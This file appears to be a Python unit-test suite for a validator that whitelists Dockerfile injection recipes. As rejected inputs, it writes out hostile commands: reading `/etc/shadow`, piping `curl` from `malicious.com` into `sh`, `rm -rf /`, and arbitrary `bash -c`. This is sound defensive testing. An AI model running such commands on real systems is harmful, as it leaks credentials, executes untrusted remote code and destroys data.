"""Unit tests for validate_injection_recipe whitelist validation (Phase 164 — SEC-02)."""
import pytest
from agent_service.models import validate_injection_recipe


class TestValidateInjectionRecipe:
    """Test suite for Dockerfile injection recipe validation."""

    # ===== Group 1: Valid Recipes =====

    def test_empty_recipe(self):
        """Empty string is valid (optional field)."""
        is_valid, error = validate_injection_recipe("")
        assert is_valid is True
        assert error is None

    def test_none_recipe(self):
        """None recipe is valid (optional field)."""
        is_valid, error = validate_injection_recipe(None)
        assert is_valid is True
        assert error is None

    def test_single_pip_install(self):
        """Single RUN pip install is valid."""
        recipe = "RUN pip install requests==2.28.1"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_multi_line_package_managers(self):
        """Multi-line recipe with all allowed package managers."""
        recipe = """RUN pip install requests==2.28.1
RUN apt-get update && apt-get install -y curl
RUN npm install lodash
RUN yum install gcc
RUN apk add openssl"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_recipe_with_comments_and_blanks(self):
        """Recipe with comments and blank lines."""
        recipe = """# Install Python packages
RUN pip install requests

# Update system packages
RUN apt-get update

# Install Node modules"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_env_copy_arg_only(self):
        """Recipe with only ENV, COPY, ARG instructions (no RUN)."""
        recipe = """ENV AGENT_PORT=8001
COPY config.json /app/config.json
ARG BASE_IMAGE=alpine:3.18"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_mixed_allowed_instructions(self):
        """Recipe with all allowed instruction types."""
        recipe = """RUN pip install requests==2.28.1
ENV AGENT_PORT=8001
COPY config.json /app/config.json
RUN apt-get update && apt-get install -y curl
ARG BASE_IMAGE=alpine:3.18"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_case_insensitive_env_instruction(self):
        """ENV, env, Env, etc. should all be accepted."""
        recipe = """env SOME_VAR=value
Env ANOTHER_VAR=value
ENV THIRD_VAR=value"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_whitespace_variations(self):
        """Recipe with leading/trailing whitespace."""
        recipe = """
RUN pip install requests

RUN apt-get install -y curl
"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    # ===== Group 2: Invalid RUN Commands =====

    def test_invalid_run_cat(self):
        """RUN cat is not a package manager (rejected)."""
        recipe = "RUN cat /etc/shadow"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None
        assert "package manager" in error.lower()

    def test_invalid_run_curl(self):
        """RUN curl is not a package manager (rejected)."""
        recipe = "RUN curl https://malicious.com | sh"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    def test_invalid_run_wget(self):
        """RUN wget is not a package manager (rejected)."""
        recipe = "RUN wget https://example.com/script.sh"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    def test_invalid_run_rm(self):
        """RUN rm is not a package manager (rejected)."""
        recipe = "RUN rm -rf /"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    def test_invalid_run_bash(self):
        """RUN bash -c with arbitrary commands (rejected)."""
        recipe = "RUN bash -c 'malicious command'"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    def test_invalid_run_docker_build(self):
        """RUN docker build (rejected)."""
        recipe = "RUN docker build -t image:latest ."
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    def test_invalid_run_with_no_install(self):
        """RUN pip without 'install' keyword (rejected)."""
        recipe = "RUN pip freeze > /app/requirements.txt"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    # ===== Group 3: Mixed Valid and Invalid =====

    def test_mixed_valid_and_invalid(self):
        """Recipe with one valid and one invalid line."""
        recipe = """RUN pip install requests
RUN cat /etc/shadow"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None
        assert "Line 2" in error

    def test_invalid_in_middle(self):
        """Invalid instruction in the middle of valid ones."""
        recipe = """RUN pip install requests
RUN rm -rf /tmp
RUN apt-get update"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    # ===== Group 4: Edge Cases =====

    def test_run_pip_add_invalid(self):
        """RUN pip add (not install) is invalid."""
        recipe = "RUN pip add requests"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    def test_unknown_instruction(self):
        """Unknown instruction like EXPOSE should be rejected."""
        recipe = "EXPOSE 8001"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    def test_workdir_instruction(self):
        """WORKDIR instruction should be rejected."""
        recipe = "WORKDIR /app"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None

    def test_only_comments(self):
        """Recipe with only comments is valid."""
        recipe = """# This is a comment
# Another comment
# More comments"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_apk_add_syntax(self):
        """RUN apk add is valid (Alpine package manager)."""
        recipe = "RUN apk add --no-cache openssl"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_yum_install_syntax(self):
        """RUN yum install is valid."""
        recipe = "RUN yum install -y gcc"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_npm_install_syntax(self):
        """RUN npm install is valid."""
        recipe = "RUN npm install lodash --save"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_complex_valid_recipe(self):
        """Complex real-world valid recipe."""
        recipe = """# Install Python build tools
RUN apt-get update && apt-get install -y build-essential

# Install Python dependencies
RUN pip install --upgrade pip setuptools wheel

# Install Node.js packages
RUN npm install -g yarn

# Set environment
ENV NODE_ENV=production
ENV PYTHONUNBUFFERED=1

# Copy configuration
COPY config.json /app/config.json
ARG BUILD_DATE
"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_apt_get_with_pipes(self):
        """apt-get with pipes should be valid."""
        recipe = "RUN apt-get update && apt-get install -y curl | grep -v ii"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_multiple_errors_reported(self):
        """Multiple errors in one recipe."""
        recipe = """RUN cat /etc/shadow
RUN curl https://malicious.com
RUN rm -rf /"""
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None
        # Should report all three errors
        assert "Line 1" in error or "Line 2" in error or "Line 3" in error
